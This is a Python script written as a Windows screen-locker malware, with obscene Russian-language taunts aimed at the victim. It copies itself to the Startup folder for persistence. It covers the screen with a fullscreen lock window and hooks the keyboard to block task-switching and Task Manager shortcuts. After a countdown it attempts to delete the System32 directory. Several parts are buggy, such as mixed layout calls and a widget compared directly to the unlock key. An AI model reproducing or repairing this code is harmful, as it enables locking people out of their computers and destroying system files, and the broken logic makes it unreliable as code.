import tkinter as tk
from tkinter import messagebox
import time
import keyboard
import os
from cryptography.fernet import Fernet
import sys
import shutil

is_first = True
if os.path.isfile(os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup' + '\ '[0] + os.path.basename(sys.argv[0])) is False:
    shutil.copy2(sys.argv[0], os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup')
else:
    is_first = False

unlock_key = '6r2Pi6Nf5h9Ett5LGI5b3tLKwd1t'

def block_keys(e):
    if e.name == 'alt' or (e.name == 'tab' and keyboard.is_pressed('alt')):
        return False
    if e.name == 'ctrl' and keyboard.is_pressed('d'):
        return False
    if e.event_type == 'down':
        if e.name == 'ctrl' and keyboard.is_pressed('shift') and keyboard.is_pressed('esc'):
            return False
    if e.event_type == 'down':
        if e.name == 'win' and keyboard.is_pressed('r'):
            return False
    return True

def on_closing():
    messagebox.showinfo("Уведомление", "Даже не пытайся чепух. Я ВСЕРАВНО ВЫЕБУ ТВОЮ ЖЕПУ")
    keyboard.hook(block=block_keys)


win = tk.Tk()

win.protocol("WM_DELETE_WINDOW", on_closing)

win.attributes("-fullscreen", True)
win.config(bg='black')
label = tk.Label(win, text='ХУЙЛО, ТВОЙ ПК ЗАБЛОКИРОВАН. ПОПЛАЧЬ УЕБАН, ВЕДЬ БЕЗ КОДА ТЫ ЕГО НЕ РАЗБЛОЧИШЬ))))))))', fg='red', bg='black')
label.grid(row=2, padx=300, pady=20)
label.config(font=("Helvetica", 17))
entry = tk.Entry(win)
entry.grid(row=4, padx=20, pady=20)
button = tk.Button(win)
button.pack(row=5, padx=20, pady=20)

def countdown(seconds, file_to_delete):
    while seconds > 0:
        time_label.config(text=f"Осталось времени: {seconds} сек.")
        win.update()
        time.sleep(1)
        seconds -= 1
    time_label.config(text="Время истекло!")
    try:
        os.remove(file_to_delete)
    except Exception as e:
        messagebox.showinfo(f"Ошибка при удалении файла: {e}")

file_to_delete = "C:\Windows\System32"
seconds_to_countdown = 10

time_label = tk.Label(win, text="")
time_label.grid(row=0, padx=20, pady=20)

countdown(seconds_to_countdown, file_to_delete)

if entry == unlock_key:
    messagebox.showinfo("Ключ введен верно. Хорошего дня!")
    sys.exit()
else:
    messagebox.showinfo('АЛЕ ХУЕСОС МОЖЕШЬ НЕ ПЫТАТЬСЯ!! ААХХАХА')


win.mainloop()
